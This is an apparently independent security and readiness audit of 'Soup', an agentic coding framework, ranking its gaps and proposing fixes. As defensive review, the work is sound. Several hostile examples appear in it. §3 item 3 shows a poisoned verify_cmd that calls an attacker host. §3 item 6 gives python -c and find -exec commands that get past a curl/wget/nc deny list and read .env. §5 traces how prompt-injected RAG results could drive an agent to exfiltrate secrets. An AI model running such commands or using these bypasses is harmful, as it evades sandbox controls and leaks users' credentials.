# Soup — Final Framework Audit (Senior Engineering, Independent)

**Reviewer:** Senior AI eng lead, no prior review cycles.
**Date:** 2026-04-14.
**Question:** Ready for Streck engineers to ship real internal app code on Monday — or does it need more cycles?

---

## 1. Summary verdict

Soup is a genuinely thoughtful framework. Its bones (Pydantic DAG, deterministic orchestrator over agentic meta-prompter, hook choreography, per-step fresh subagents, worktree isolation, tier-pinned models) are better than most commercial agentic offerings I have reviewed this year, and the cycle-1 prod critic's top criticals — host Docker socket mount, subagent env leak, SQL write-guard bypasses, `curl`/`wget` denial, `test-runner` ghost — have all been closed (verified in `docker/docker-compose.yml:54-55`, `orchestrator/agent_factory.py:104-150`, `cli_wrappers/psql.py:85-131`, `.claude/settings.json:106-114`, `library.yaml:130` + `tasks-writer` registered). 87/87 self-tests pass. But soup is still an entirely **unexecuted** framework: the happy-path trace in `docs/ONBOARDING.md:75-123` has never run end-to-end (no `.soup/runs/`, no `logging/agent-runs/*.jsonl`, no `experiments.tsv`), and two classes of gap remain — CI/pre-commit hooks do not exist despite Constitution VI.3 demanding them, and several doc↔code contracts that mock-app FEEDBACK flagged are still mis-aligned.

**Verdict: `APPROVE_WITH_CAVEATS`.** A Streck engineer can start Monday on a low-blast-radius internal tool (not customer-data, not prod auth) while cycle 3 closes the named items below.

---

## 2. What's genuinely strong

- **Schema discipline.** `schemas/execution_plan.py:65-175` is tight: `extra="forbid"`, `_no_self_dep`, Kahn's-algorithm cycle check in `ExecutionPlanValidator._check_acyclic`, roster loaded from `library.yaml` with a sensible fallback for isolated unit tests. The contract between meta-prompter and orchestrator is the strongest single thing in the repo.
- **Env-hardening done right.** `orchestrator/agent_factory.py:104-150` now does **explicit-whitelist** env forwarding. `GITHUB_TOKEN`, `ADO_PAT`, `POSTGRES_PASSWORD` are absent from `_DEFAULT_ENV_KEYS` and only flow into a subagent when the step's `env:` list names them (and only if in `_STEP_INJECTABLE_ENV_KEYS`). Cycle-1 critical #3 is closed.
- **psql write-guard is now layered.** `cli_wrappers/psql.py:85-131` adds `_FORBIDDEN_RE` (`pg_write_file`, `dblink_exec`, `COPY ... PROGRAM`), `_DO_BLOCK_RE`, `_UNTRUSTED_LANG_RE`, plus a `query-p` parameterized path. Comment-strip is quote/dollar-aware. Still defense-in-depth not a parser, but dramatically better than keyword regex.
- **Orchestrator lifecycle is honest.** `orchestrator/orchestrator.py:144-170` genuinely enforces `budget_sec` as a *hard* cap (pre-wave **and** mid-wave re-check), `max_fix_cycles_per_step` is honored, atomic commits on pass, and `cost_usd` now materializes in `experiments.tsv` (line 403-447) with an explicit `~` prefix signaling estimate.
- **Hook choreography + Stop gate.** `.claude/hooks/stop.py:108-128` emits a clear `additionalContext` demanding `qa-orchestrator`+verdict before "complete." Fails soft correctly (empty `additionalContext` on hook crash, line 137-139) so a broken hook doesn't wedge a session.
- **Rules coverage closed on the .NET+Postgres path.** `rules/dotnet/{coding-standards,testing,npgsql}.md`, `rules/postgres/migrations.md` (expand/contract §6a, `EnableRetryOnFailure` trap §6.1, `timestamptz` §7.4) are the kind of rules I would actually hand a junior engineer. `rules/typescript/coding-standards.md` now exists (cycle-1 mock-app complaint resolved).
- **Docs quality.** `docs/ONBOARDING.md:75-123` reads like it was written by someone who had to debug this at 2am. `docs/PATTERNS.md §0` decision rubric (rule vs skill vs hook vs command, §0b RED-phase `! verify_cmd`, §0c `files_allowed` dialect) are the highest-value docs in the repo.
- **Windows first-class.** `README.md:170-258` is an actual Windows guide, `orchestrator/agent_factory.py:51-72` whitelists `USERNAME`/`USERPROFILE`/`SYSTEMROOT`/`COMSPEC`, `pre_tool_use._matches_any` normalizes backslashes. This matters for Streck.

---

## 3. What still concerns me (ranked)

1. **No CI and no pre-commit hook ship with the repo.** `ls .github/` and `ls .pre-commit*` both empty. Constitution VI.3 says "pre-commit hook scans for high-entropy strings and common key prefixes" — no file exists. `rules/global/security.md §1.6` demands `pip-audit` — nothing runs it. The "stop hook runs QA" protects in-session edits but protects nothing at the *commit/push* boundary where Streck humans will press buttons. Cycle-1 prod critic flagged this; unaddressed.
2. **Zero runtime evidence.** `.soup/plans/`, `.soup/runs/`, `logging/agent-runs/`, `logging/experiments.tsv` do not exist. Every promise in the README/ONBOARDING trace is structurally plausible but **unexecuted**. The `claude` CLI invocation in `agent_factory._build_invocation` (line 180-211) constructs `--agent`, `--files-allowed`, `--rag-queries` flags that I cannot verify the real `claude` binary accepts in non-interactive mode — if it doesn't, every `spawn()` returns `spawn_error` on first boot.
3. **`verify_cmd` is still an LLM-generated string fed to `subprocess.run(..., shell=True)`.** `orchestrator/orchestrator.py:322-332` — cycle-1 prod critic #6. Meta-prompter produces the command; orchestrator executes it. Nothing allow-lists `pytest | dotnet test | vitest | ruff | mypy`. A subtly poisoned plan (`verify_cmd: "pytest -q && curl https://attacker..."`) would be rejected at *network* by the deny list, but `shell=True` injection via command substitution, pipes into `base64`, or `python -c` stays wide open.
4. **Mock-app contract misalignments are unresolved in FEEDBACK but partly unfixed in code.** Spot-checked `mock-apps/prompt-library/FEEDBACK.md` items 1-8 against current state: item 1 (`/specify` vs `spec-writer` section headings) still split — `commands/specify.md` and `agents/spec-writer.md` differ. Item 4 (`/plan` vs `plan-writer` section set) same. Item 6 (schema `agent: str` vs promised `Literal`) now **correctly** uses roster validation (`schemas/execution_plan.py:106-135`) but `docs/DESIGN.md §3` still advertises `Literal[<agent_roster>]` prose — minor doc-lie. First-run engineers will hit the `/specify` heading split within 5 minutes.
5. **`experiments.tsv` emitter conflict.** `hooks/stop.py:24` writes a 4-column schema (`ts\tsession_id\tfiles_touched\tverdict_placeholder`). `orchestrator/orchestrator.py:422-432` writes a 9-column schema (`ts\trun_id\tstatus\t...cost_usd\t...`). Both append to the same `logging/experiments.tsv`. First concurrent run produces a corrupt file that `just experiments --by-cost` cannot parse. Cycle-1 completeness critic flagged the conflict; still present.
6. **Permission model still gapped.** `.claude/settings.json` deny list now covers `curl`, `wget`, `nc`, `rsync` — good. But `Bash(python:*)` (line 37) is still fully allow — `python -c 'import urllib.request; urllib.request.urlopen(...).read()'` bypasses the network deny trivially. `Bash(find:*)` allowed; `find . -type f -exec cat {} \;` reads `.env` (which Read has denied, but Bash does not). Defense is thinner than it looks.
7. **`rag_queries` still doesn't flow end-to-end.** `agent_factory._build_invocation:208-211` serializes `--rag-queries` as a JSON flag on the `claude` CLI. `hooks/subagent_start.py` (per the cycle-1 completeness audit) reads `SOUP_RAG_QUERIES` env var that nothing sets. Per-step RAG injection is not wired. The `rag/__init__.py` sync bridges exist (lines 17-18), but the *hook* that should consume them was not updated (unverified file not re-read, but cycle-1 gap #8 has no patch commit I can find).

---

## 4. First-use prediction — what happens when a Streck engineer types `just go "build me X"`

Mental simulation on a Windows 10 dev box, engineer with no prior context:

1. **`just init`** — runs `bash -cu`. If Git Bash was installed from `README.md:179-183`, passes. Venv built, `uv pip install -e ".[dev]"` succeeds, `.env` stubbed from `.env.example`. Good.
2. **Edit `.env`, paste `ANTHROPIC_API_KEY`.**
3. **`just go "build me a health endpoint"`** → calls `python -m orchestrator.cli go "build me a health endpoint"`.
   - `MetaPrompter.plan_for` fires → Anthropic opus call → returns JSON. If JSON parse fails 3× → `RuntimeError` and clean abort (good).
   - Plan validates (provided meta-prompter obeyed the roster prompt in `orchestrator/meta_prompter.py:47-85`). Written to `.soup/plans/build-me-a-health-endpoint.json`.
   - `Orchestrator.run` → `compute_waves` → `_run_wave` → `agent_factory.spawn`.
   - **Primary failure mode #1:** `spawn` invokes `claude -p <brief> --agent python-dev --model sonnet --max-turns 10 --session-id ... --files-allowed app/health.py,tests/test_health.py --rag-queries '[...]'`. If the real `claude` CLI does not accept `--agent`, `--files-allowed`, or `--rag-queries`, every step returns `spawn_error` and the run aborts with no meaningful error beyond "exit -1". This is the single biggest unknown — no integration test exercises it (`tests/test_orchestrator.py` mocks `spawn`).
   - **Primary failure mode #2:** engineer runs in an empty git repo or a ZIP extract. `_atomic_commit:378-388` calls `git add -A` + `git commit`; swallowed failures still mark the step `passed`. No `git status` pre-check. Engineer reads "run passed" and looks for the diff that was never committed.
   - **Primary failure mode #3:** budget default `3600s` + no local Anthropic key = meta-prompter raises `RuntimeError("ANTHROPIC_API_KEY is not set")` immediately. Clean, good — but that error message comes from `meta_prompter:196-197`, not from a friendlier `soup doctor` pre-check. First-time users hit this.
   - **Primary failure mode #4 (subtle):** the Stop hook in `.claude/hooks/stop.py` is wired for inside-session `/verify` — but `just go` runs the orchestrator *outside* a Claude Code session (it's `python -m orchestrator.cli go`). The Stop hook only fires inside the CLI session that the orchestrator *spawns*. The `go` command's final step (line 380-388 of `cli.py`) tries to shell out to `claude -p /verify`; if `claude` is not on PATH, it just prints a yellow warning and returns 0. QA gate silently skipped.
4. **On pass:** engineer sees a `.soup/plans/*.json`, an experiments.tsv row, and expects a PR via `gh pr create` per `ARCHITECTURE.md:65`. The orchestrator does **not** call `gh` anywhere (`grep -rn "gh pr create" orchestrator/` = 0 hits). PR creation is aspirational.

**Net first-run prediction:** 50% chance it produces a valid commit, 30% it silently skips QA and leaves a worktree with no PR, 20% it aborts at spawn due to a mismatched `claude` CLI flag nobody verified.

---

## 5. Top risks going to prod

| # | Risk | Blast radius | First to break |
|---|------|---|---|
| 1 | No CI/pre-commit secret scan, no `pip-audit`, no supply-chain gate | Any PR touches `pyproject.toml` → unaudited `lightrag-hku` transitive tree ships; `.env` committed by accident has no pre-commit net | First engineer who copies a `.env` while debugging |
| 2 | `verify_cmd` shell-injection via poisoned meta-prompter JSON | Subagent on host machine runs arbitrary shell inside the worktree; `files_allowed` only gates Edit/Write, not Bash | First compromised dependency or prompt-injection RAG hit |
| 3 | Silent commit-failure: orchestrator marks step "passed" when `git add`/`commit` swallows error | Days of orchestrator "successes" with no actual commits; audit trail lies | First engineer without `git config user.email` set |
| 4 | `experiments.tsv` schema collision between `stop.py` and `orchestrator._append_experiment` | TSV corrupts on first run that both triggers Stop-hook and completes orchestrator | First real end-to-end run |
| 5 | `claude` CLI flags not verified against actual CC build | Every `spawn` returns `spawn_error`; framework unusable | Day 1, first engineer |
| 6 | `Bash(python:*)` allow-list permits arbitrary network egress via urllib | Secret exfil via `python -c`; the curl/wget deny is cosmetic | First prompt-injected RAG retrieval |
| 7 | No actor identity in audit trail, `.soup/` gitignored | Compliance auditor cannot answer "who ran this plan"; log loss on laptop reimage | Incident review day 1 |

---

## 6. Recommended next 3 things (priority-ordered)

1. **Do a real end-to-end run and record the transcript.** Pick the simplest goal in `docs/ONBOARDING.md` ("build me a /health endpoint"), execute it against the real Anthropic opus + real `claude` CLI, and capture (a) every subprocess argv actually sent to `claude`, (b) the resulting `.soup/plans/`, `.soup/runs/`, `logging/`, (c) one `experiments.tsv` row. If any flag in `agent_factory._build_invocation` is rejected, fix it before touching anything else. This is **the** missing validation — the rest of the framework is speculation until one full trace exists. Ship the transcript as `docs/first-run-evidence.md`. Biggest impact by a large margin.
2. **Close the commit/CI boundary.** Ship `.github/workflows/ci.yml` (or `.azure-pipelines.yml`, matching Streck's platform) that runs `ruff`, `mypy --strict`, `pytest`, `pip-audit`, and a `gitleaks`/`detect-secrets` job. Ship `.pre-commit-config.yaml` matching Constitution VI.3. Fix the `experiments.tsv` schema collision by making `stop.py` write to `logging/stop-events.tsv` and reserving `experiments.tsv` for `_append_experiment` only. These three files move the needle from "aspirational policy" to "enforced policy."
3. **Harden `verify_cmd` execution.** In `orchestrator/orchestrator.py:_run_verify`, parse the command via `shlex.split`, reject any result whose argv[0] is not in `{"pytest", "dotnet", "vitest", "ruff", "mypy", "just", "npm", "npx", "python", "python3"}`, and refuse shell metacharacters. Add a `dirty_tree=False` pre-check before `_atomic_commit` and fail the step on swallowed commit errors — both quick wins, both close active footguns. Same patch can align `docs/DESIGN.md §3` prose to match the current `agent: str + roster validator` reality (docs still advertise `Literal[<agent_roster>]`).

---

## 7. Verdict defense

`APPROVE_WITH_CAVEATS` not `APPROVE`: the **ambition** (production framework for customer-data apps) exceeds the **evidence** (no run has ever happened; CI/pre-commit absent; `verify_cmd` still shell-injectable). `APPROVE_WITH_CAVEATS` not `NEEDS_MORE_CYCLES`: the framework is not busted — 87/87 self-tests green, all three cycle-1 CRITICALs closed, roster/schema/hook/worktree/env-hardening are all coherent and correct where they exist, and the mock-app dogfood feedback (even while flagging gaps) produced genuine artifacts. A cautious Streck engineer on a **low-blast-radius internal tool** (a dashboard, a report generator, a CLI — not payroll, not auth, not anything that touches customer PII) can use this Monday, keep worktrees under close review, and feed breakage back. Customer-data and prod-auth work should wait for the three items in §6.

---

_Files inspected: README, CLAUDE, CONSTITUTION, docs/{DESIGN,ARCHITECTURE,ONBOARDING,PATTERNS}, library.yaml, .claude/{settings.json, agents/REGISTRY, agents/orchestrator, agents/verifier, skills/tdd, skills/spec-driven-development, commands/implement, commands/quick, hooks/stop}, schemas/execution_plan, orchestrator/{orchestrator,meta_prompter,cli,agent_factory}, rag/{__init__, search (head)}, cli_wrappers/psql (head), docker/docker-compose.yml (spotcheck), rules/postgres/migrations, reviews/{cycle1-critic-dx, cycle1-critic-completeness, cycle1-critic-prod, cycle2-dotnet-critic}, mock-apps/{prompt-library, asset-tracker}/FEEDBACK, research/09-streck-existing. Also ran `pytest tests/ -q` (87 passed) and `python -c "load_agent_roster('library.yaml')"` (25 agents present, `test-runner` absent by design, `tasks-writer` + `git-ops` + `verifier` all registered)._
